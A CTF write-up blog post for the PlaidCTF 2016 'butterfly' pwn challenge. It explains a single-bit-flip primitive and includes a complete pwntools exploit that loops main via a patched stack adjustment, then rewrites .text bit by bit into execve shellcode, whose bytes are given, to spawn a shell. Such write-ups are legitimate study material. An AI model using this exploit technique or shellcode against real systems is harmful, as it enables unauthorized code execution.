---
layout: post
alias: "/blog/2016/04/18/plaidctf-2016-butterfly/"
date: 2016-04-18T06:00:01+09:00
tags: [ "ctf", "pwn", "writeup", "plaidctf", "mprotect" ]
---

# PlaidCTF 2016 butterfly

I like this problem, but this is a little easy.

## problem

``` sh
$ file butterfly
butterfly: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=daad8fa88bfeef757675864191b0b162f8977515, not stripped
```

``` sh
$ nc butterfly.pwning.xxx 9999
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
33554432
WAS IT WORTH IT???
```

The program `fgets` a integer $p$ using `strtol`, then flips the $(p \bmod 8)$-th bit of the address $\lfloor p / 8 \rfloor$.
The flipping is under `mprotect`, so you can flip even the `.text` section.

## solution

At first, we can flip arbitrary $1$-bit.
To enable to flip many bits, the first flipping is this:

``` asm
from:
  400860:	48 83 c4 48          	add    rsp,0x48
to:
  400860:	48 83 c4 08          	add    rsp,0x8
```

This is an instruction to return from the `main`, so this let us ROP, and now we can flip as many bits as we like.

Next, send a shellcode onto `.text` section, using flipping.
I wrote it here, and jump by making an error.

``` asm
  40086b:	bf 42 09 40 00       	mov    edi,0x400942 # "mprotect1"
  400870:	e8 fb fd ff ff       	call   400670 <perror@plt>
  ...
```

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()
context.log_level = 'debug'

p = remote(args.host, args.port)

main = 0x400788
def thy_cosmic_ray(ptr):
    p.recvline()
    payload = ''
    payload += str(ptr)
    payload += ' ' * (8 - len(payload))
    payload += 'BBBBBBBB' # rbx
    payload += 'CCCCCCCC' # r14
    payload += 'DDDDDDDD' # r15
    payload += 'EEEEEEEE' # rbp
    payload += p64(main)
    payload += '\n'
    log.info(repr(payload))
    p.send(payload)
    p.recvline()

thy_cosmic_ray(0x400863 * 8 + 6) # make `add rsp, 0x48' to `add rsp, 0x8'

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

addr = 0x40086b
text = "\xbf\x42\x09\x40\x00\xe8\xfb\xfd\xff\xff\xeb\xd6\xbf\x4c\x09\x40\x00\xe8\xef\xfd\xff\xff\xeb\xca\xe8\x88\xfd\xff\xff\x0f\x1f\x84\x00\x00\x00\x00\x00"

for (i, (frm, to)) in enumerate(zip(text, shellcode)):
    for j in range(8):
        if (ord(frm) ^ ord(to)) & (1 << j):
            thy_cosmic_ray((addr + i) * 8 + j)

p.recvline()
p.sendline('foo') # jump to perror

time.sleep(1)
p.sendline('id')
p.interactive()
```
